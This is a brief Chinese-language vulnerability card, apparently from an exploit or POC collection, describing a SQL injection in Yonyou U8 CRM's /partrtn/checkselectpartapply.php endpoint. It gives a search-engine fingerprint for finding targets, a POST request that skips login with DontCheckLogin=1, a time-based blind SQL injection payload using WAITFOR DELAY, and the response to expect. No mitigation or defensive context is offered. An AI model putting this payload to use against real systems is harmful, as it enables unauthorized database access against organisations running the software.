# 用友U8CRMcheckselectpartapply.php存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友U8CRM"`
- **请求**：`POST /partrtn/checkselectpartapply.php?DontCheckLogin=1 HTTP/1.1`

**Payload**
```
applyIDs=1);WAITFOR+DELAY+'0:0:3'--
```
- **响应特征**：200